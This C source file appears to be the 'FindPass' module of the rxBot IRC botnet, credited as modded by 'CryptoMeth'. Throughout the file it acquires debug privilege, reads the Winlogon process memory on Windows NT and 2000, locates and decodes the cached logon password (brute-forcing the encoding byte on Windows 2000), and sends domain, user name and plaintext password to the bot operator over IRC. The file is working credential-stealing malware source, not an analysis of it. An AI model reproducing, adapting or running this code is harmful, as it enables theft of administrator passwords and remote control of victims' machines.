#include "includes.h"
#include "functions.h"
#include "externs.h"

/* FindPass decodes and displays administrator logon credentials from Winlogon 
 in Win2000 / Winnt4 + < sp6. Windows 2000 and Windows NT administrator passwords 
 are CACHED by WinLogon using the Microsoft Graphical Identification and Authentication 
 (MSGINA.DLL) module. Written by ? , modded for rxBot by CryptoMeth. */

#ifndef NO_FINDPASS

// functions
PFNNTQUERYSYSTEMINFORMATION pfnNtQuerySystemInformation;
PFNRTLCREATEQUERYDEBUGBUFFER pfnRtlCreateQueryDebugBuffer;
PFNRTLQUERYPROCESSDEBUGINFORMATION pfnRtlQueryProcessDebugInformation;
PFNRTLDESTROYQUERYDEBUGBUFFER pfnRtlDestroyQueryDebugBuffer;
PFNTRTLRUNDECODEUNICODESTRING pfnRtlRunDecodeUnicodeString;

// globals
DWORD PasswordLength = 0;
PVOID RealPasswordP = NULL;
PVOID PasswordP = NULL;
DWORD HashByte = 0;
wchar_t UserName [0x400];
wchar_t UserDomain [0x400];


DWORD WINAPI FindPassThread(LPVOID param)
{ 
	FINDPASS findpass = *((FINDPASS *)param);
	FINDPASS *findpasss = (FINDPASS *)param;
	findpasss->gotinfo = true;

	char sendbuf[IRCLINE];

	DWORD dwOS = OSVersionCheck();
	if (dwOS == OS_WINNT || dwOS == OS_WIN2K) {
		if (AdjustPrivileges("SeDebugPrivilege", true)) {
			HINSTANCE hNtDll = LoadLibrary("NTDLL.DLL");
			pfnNtQuerySystemInformation = (PFNNTQUERYSYSTEMINFORMATION)GetProcAddress 
				(hNtDll,"NtQuerySystemInformation");
			pfnRtlCreateQueryDebugBuffer = (PFNRTLCREATEQUERYDEBUGBUFFER)GetProcAddress 
				(hNtDll,"RtlCreateQueryDebugBuffer");
			pfnRtlQueryProcessDebugInformation = (PFNRTLQUERYPROCESSDEBUGINFORMATION)GetProcAddress 
				(hNtDll,"RtlQueryProcessDebugInformation");
			pfnRtlDestroyQueryDebugBuffer = (PFNRTLDESTROYQUERYDEBUGBUFFER)GetProcAddress 
				(hNtDll,"RtlDestroyQueryDebugBuffer");
			pfnRtlRunDecodeUnicodeString = (PFNTRTLRUNDECODEUNICODESTRING)GetProcAddress 
				(hNtDll,"RtlRunDecodeUnicodeString");

			DWORD WinLogonPID = FindWinLogon();
			if (WinLogonPID != 0) { 
				GetEnvironmentVariableW(L"USERNAME", UserName, 0x400);
				GetEnvironmentVariableW(L"USERDOMAIN", UserDomain, 0x400);
	 
				bool FoundPasswordPage = ((dwOS == OS_WINNT)?(LocatePasswordPageWinNT(WinLogonPID,&PasswordLength))
					:(LocatePasswordPageWin2K(WinLogonPID,&PasswordLength)));
				if (FoundPasswordPage) { 
					if (PasswordLength == 0) 
						_snprintf(sendbuf,sizeof(sendbuf),"[FINDPASS]: The Windows logon (Pid: <%d>) information is: Domain: \\\\%S, User: (%S/(no password)).",
							WinLogonPID,UserDomain,UserName);
					else 
						sprintf(sendbuf,(dwOS == OS_WINNT)?(DisplayPasswordWinNT(WinLogonPID)):(DisplayPasswordWin2K(WinLogonPID)));
				} else	
					sprintf(sendbuf,"[FINDPASS]: Unable to find the password in memory.");
			} else 
				sprintf(sendbuf,"[FINDPASS]: Unable to find Winlogon Process ID.");

			AdjustPrivileges("SeDebugPrivilege", false);
			FreeLibrary(hNtDll);
		} else
			sprintf(sendbuf, "[FINDPASS]: Failed to enable Debug Privilege.");
	} else
		sprintf(sendbuf, "[FINDPASS]: Only supported on Windows NT/2000.");

	if (!findpass.silent) irc_privmsg(findpass.sock,findpass.chan,sendbuf,findpass.notice);
	addlog(sendbuf);

	clearthread(findpass.threadnum);

	ExitThread(0);
}

DWORD FindWinLogon(void)
{ 
	DWORD rc = 0, SizeNeeded = 0;
	PVOID InfoP = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,INITIAL_ALLOCATION);

	pfnNtQuerySystemInformation(0x10,InfoP,INITIAL_ALLOCATION,&SizeNeeded);
	HeapFree(GetProcessHeap(),0,InfoP);

	InfoP = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,SizeNeeded);
	DWORD SizeWritten = SizeNeeded;
	if (pfnNtQuerySystemInformation(0x10,InfoP,SizeNeeded,&SizeWritten)) { 
		HeapFree(GetProcessHeap(),0,InfoP);
		return (0);
	}
	
	DWORD NumHandles = SizeWritten / sizeof(QUERY_SYSTEM_INFORMATION);
	if (NumHandles == 0) { 
		HeapFree(GetProcessHeap(),0,InfoP);
		return (0);
	} 
	PQUERY_SYSTEM_INFORMATION QuerySystemInformationP = (PQUERY_SYSTEM_INFORMATION)InfoP;
 
	for (DWORD i = 1;i <= NumHandles;i++) { 
		if (QuerySystemInformationP->HandleType == 5) { 
			PVOID DebugBufferP = pfnRtlCreateQueryDebugBuffer(0,0);
			if (pfnRtlQueryProcessDebugInformation(QuerySystemInformationP->PID,1,DebugBufferP) == 0) { 
				PPROCESS_INFO_HEADER ProcessInfoHeaderP = (PPROCESS_INFO_HEADER)((DWORD)DebugBufferP + 0x60);
				DWORD Count = ProcessInfoHeaderP->Count;
				PPROCESS_INFO ProcessInfoP = (PPROCESS_INFO)((DWORD)ProcessInfoHeaderP + sizeof(PROCESS_INFO_HEADER));
				if (strstr(_strupr(ProcessInfoP->Name), "WINLOGON") != 0) { 
					DWORD dw = (DWORD)ProcessInfoP;
					for (DWORD j = 0;j < Count;j++) { 
						dw += sizeof(PROCESS_INFO);
						ProcessInfoP = (PPROCESS_INFO)dw;
						if (strstr(_strupr(ProcessInfoP->Name), "NWGINA") != 0)
							return (0);
						if (strstr(_strupr(ProcessInfoP->Name), "MSGINA") == 0)
							rc = QuerySystemInformationP->PID;
					} 
					if (DebugBufferP)
						pfnRtlDestroyQueryDebugBuffer(DebugBufferP);
					HeapFree(GetProcessHeap(),0,InfoP);

					return (rc);
				} 
			} 
			if (DebugBufferP)
				pfnRtlDestroyQueryDebugBuffer(DebugBufferP);
		} 
		DWORD dw = (DWORD)QuerySystemInformationP;
		dw += sizeof(QUERY_SYSTEM_INFORMATION);
		QuerySystemInformationP = (PQUERY_SYSTEM_INFORMATION)dw;
	} 
	HeapFree(GetProcessHeap(),0,InfoP);

	return (rc);
}

bool LocatePasswordPageWinNT(DWORD WinLogonPID,PDWORD PasswordLength)
{ 
	bool rc = false;
	HANDLE WinLogonHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,false,WinLogonPID);
	if (WinLogonHandle == 0)
		return (rc);
	*PasswordLength = 0;

	SYSTEM_INFO SystemInfo;
	GetSystemInfo(&SystemInfo);
	DWORD PEB = 0x7ffdf000;
	DWORD BytesCopied = 0;
	PVOID PEBP = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,SystemInfo.dwPageSize);
	if (!ReadProcessMemory(WinLogonHandle,(PVOID)PEB,PEBP,SystemInfo.dwPageSize,&BytesCopied)) { 
		CloseHandle(WinLogonHandle);
		return (rc);
	} 

	PDWORD WinLogonHeap = (PDWORD)((DWORD)PEBP + (6 * sizeof(DWORD)));
	MEMORY_BASIC_INFORMATION MemoryBasicInformation;
	if (VirtualQueryEx(WinLogonHandle,(PVOID)*WinLogonHeap,&MemoryBasicInformation,sizeof(MEMORY_BASIC_INFORMATION)))
		if (((MemoryBasicInformation.State & MEM_COMMIT) == MEM_COMMIT) && ((MemoryBasicInformation.Protect & PAGE_GUARD) == 0)) { 
			PVOID WinLogonMemP = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,MemoryBasicInformation.RegionSize);
			if (ReadProcessMemory(WinLogonHandle,(PVOID)*WinLogonHeap,WinLogonMemP,MemoryBasicInformation.RegionSize,&BytesCopied)) { 
				DWORD i = (DWORD)WinLogonMemP;
				DWORD UserNamePos = 0;

				do { 
					if ((wcsicmp(UserName,(wchar_t *)i) == 0) 
						&& (wcsicmp(UserDomain,(wchar_t *)(i + USER_DOMAIN_OFFSET_WINNT)) == 0)) { 
						UserNamePos = i;
						break;
					} 
					i += 2;
				} while (i < (DWORD)WinLogonMemP + MemoryBasicInformation.RegionSize);

				if (UserNamePos) { 
					PENCODED_PASSWORD_INFO EncodedPasswordInfoP = (PENCODED_PASSWORD_INFO)((DWORD)UserNamePos + USER_PASSWORD_OFFSET_WINNT);

					FILETIME LocalFileTime;
					SYSTEMTIME SystemTime;
					if (FileTimeToLocalFileTime(&EncodedPasswordInfoP->LoggedOn,&LocalFileTime))
						if (FileTimeToSystemTime(&LocalFileTime,&SystemTime))
							*PasswordLength = (EncodedPasswordInfoP->EncodedPassword.Length & 0x00ff) / sizeof(wchar_t);
 
					HashByte = (EncodedPasswordInfoP->EncodedPassword.Length & 0xff00) >> 8;
					RealPasswordP = (PVOID)(*WinLogonHeap + (UserNamePos - (DWORD)WinLogonMemP) + USER_PASSWORD_OFFSET_WINNT + 0x34);
					PasswordP = (PVOID)((PBYTE)(UserNamePos + USER_PASSWORD_OFFSET_WINNT + 0x34));
					rc = true;
				} 
			} 
		} 
	HeapFree(GetProcessHeap(),0,PEBP);
	CloseHandle(WinLogonHandle);

	return (rc);
}

bool LocatePasswordPageWin2K(DWORD WinLogonPID, PDWORD PasswordLength)
{ 
	HANDLE WinLogonHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,false,WinLogonPID);
	if (WinLogonHandle == 0)
		return (false);

	*PasswordLength = 0;
	SYSTEM_INFO SystemInfo;
	GetSystemInfo(&SystemInfo);
	DWORD i = (DWORD)SystemInfo.lpMinimumApplicationAddress;
	DWORD MaxMemory = (DWORD)SystemInfo.lpMaximumApplicationAddress;
	DWORD Increment = SystemInfo.dwPageSize;
	MEMORY_BASIC_INFORMATION MemoryBasicInformation;

	while (i < MaxMemory) { 
		if (VirtualQueryEx(WinLogonHandle,(PVOID)i,&MemoryBasicInformation,sizeof(MEMORY_BASIC_INFORMATION))) { 
			Increment = MemoryBasicInformation.RegionSize;
			if (((MemoryBasicInformation.State & MEM_COMMIT) == MEM_COMMIT)
				&& ((MemoryBasicInformation.Protect & PAGE_GUARD) == 0)) { 
				PVOID RealStartingAddressP = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,MemoryBasicInformation.RegionSize);
				DWORD BytesCopied = 0;

				if (ReadProcessMemory(WinLogonHandle,(PVOID)i,RealStartingAddressP,MemoryBasicInformation.RegionSize,&BytesCopied)) { 
					if ((wcsicmp((wchar_t *)RealStartingAddressP, UserName) == 0) 
						&& (wcsicmp((wchar_t *)((DWORD)RealStartingAddressP + USER_DOMAIN_OFFSET_WIN2K), UserDomain) == 0)) { 
						RealPasswordP = (PVOID)(i + USER_PASSWORD_OFFSET_WIN2K);
						PasswordP = (PVOID)((DWORD)RealStartingAddressP + USER_PASSWORD_OFFSET_WIN2K);

						PBYTE p = (PBYTE)PasswordP;
						DWORD Loc = (DWORD)p;
						DWORD Len = 0;
						if ((*p == 0) && (* (PBYTE)((DWORD)p + 1) == 0));
						else 
							do { 
								Len++;
								Loc += 2;
								p = (PBYTE)Loc;
							} while (*p != 0);
						*PasswordLength = Len;
						CloseHandle(WinLogonHandle);

						return (true);
					} 
				} 
				HeapFree(GetProcessHeap(),0,RealStartingAddressP);
			} 
		} else 
			Increment = SystemInfo.dwPageSize;

		i += Increment;
	} 
	CloseHandle(WinLogonHandle);

	return (false);
}

char *DisplayPasswordWinNT(DWORD WinLogonPID)
{ 
	static char buffer[IRCLINE];

	UNICODE_STRING EncodedString;
	EncodedString.Length = (WORD)PasswordLength * sizeof(wchar_t);
	EncodedString.MaximumLength = ((WORD)PasswordLength * sizeof(wchar_t)) + sizeof(wchar_t);
	EncodedString.Buffer = (PWSTR)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,EncodedString.MaximumLength);
	CopyMemory(EncodedString.Buffer,PasswordP,PasswordLength * sizeof(wchar_t));

	pfnRtlRunDecodeUnicodeString((BYTE)HashByte,&EncodedString);

	_snprintf(buffer,sizeof(buffer),"[FINDPASS]: The Windows logon (Pid: <%d>) information is: Domain: \\\\%S, User: (%S/%S).",
		WinLogonPID,UserDomain,UserName,EncodedString.Buffer);

	HeapFree(GetProcessHeap(),0,EncodedString.Buffer);

	return (buffer);
}

char *DisplayPasswordWin2K(DWORD WinLogonPID)
{ 
	static char buffer[IRCLINE];
 
	DWORD i, Hash = 0;
	UNICODE_STRING EncodedString;
	EncodedString.Length = (USHORT)PasswordLength * sizeof(wchar_t);
	EncodedString.MaximumLength = ((USHORT)PasswordLength * sizeof(wchar_t)) + sizeof(wchar_t);
	EncodedString.Buffer = (PWSTR)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,EncodedString.MaximumLength);

	for (i = 0;i <= 0xff;i++) { 
		CopyMemory(EncodedString.Buffer, PasswordP, PasswordLength * sizeof(wchar_t));

		pfnRtlRunDecodeUnicodeString((BYTE)i,&EncodedString);

		PBYTE p = (PBYTE)EncodedString.Buffer;
		bool Viewable = true;
		DWORD j, k;
		for (j = 0;(j < PasswordLength) && Viewable;j++) { 
			if ((*p) && (*(PBYTE)(DWORD(p) + 1) == 0)) { 
				if (*p < 0x20) 
					Viewable = false;
				if (*p > 0x7e) 
					Viewable = false;
			} else 
				Viewable = false;
			k = DWORD(p);
			k++;k++;
			p = (PBYTE)k;
		} 
		if (Viewable)
			_snprintf(buffer,sizeof(buffer),"[FINDPASS]: The Windows logon (Pid: <%d>) information is: Domain: \\\\%S, User: (%S/%S).",
				WinLogonPID,UserDomain,UserName,EncodedString.Buffer);
		else
			_snprintf(buffer,sizeof(buffer),"[FINDPASS]: The Windows logon (Pid: <%d>) information is: Domain: \\\\%S, User: (%S/(N/A)).",
				WinLogonPID,UserDomain,UserName);
	} 
	HeapFree(GetProcessHeap(),0,EncodedString.Buffer);

	return (buffer);
} 
#endif
